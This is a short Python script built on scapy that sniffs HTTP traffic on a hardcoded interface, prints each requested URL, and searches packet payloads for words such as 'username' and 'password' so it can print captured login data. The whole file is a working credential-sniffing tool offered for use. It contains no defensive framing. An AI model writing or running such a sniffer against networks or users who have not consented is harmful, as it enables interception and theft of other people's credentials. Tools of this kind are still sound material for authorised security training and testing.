#!/usr/bin/env python

import scapy.all as scapy
from scapy.layers import http



#def get_arguments():
#    parser = optparse.OptionParser()
#    parser.add_option("-i", "--interface", dest="interface", help="Please specify network interface : example:eth,wlan and etc...")

#    (options, arguments) = parser.parse_args()
#    print(options.target_network)
#    if not options.target_network:
#        parser.error("[-] Please specify  correct interface: example eth,wlan,tun  or use --help for info.")
#    return options


def sniffer(interface):
    scapy.sniff(iface=interface, store=False, prn=process_sniffed_packed)

def get_url(packet):
    return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path 

def get_login_info(packet):
    if packet.haslayer(scapy.Raw):
            load = packet[scapy.Raw].load
            keywords = ["email","username", "login", "user", "password", "pass"]
            for keyword in keywords:
                if keyword in load:
                   return load

def process_sniffed_packed(packet):
    if packet.haslayer(http.HTTPRequest):
        url = get_url(packet)
        print("[+] HTTP Request >>" + str(url))
        login_info = get_login_info(packet)

        if login_info:
            print("\n\n[+] Possible user and password >> " + login_info + "\n\n")
        

#interface = get_arguments()


sniffer("eth0")
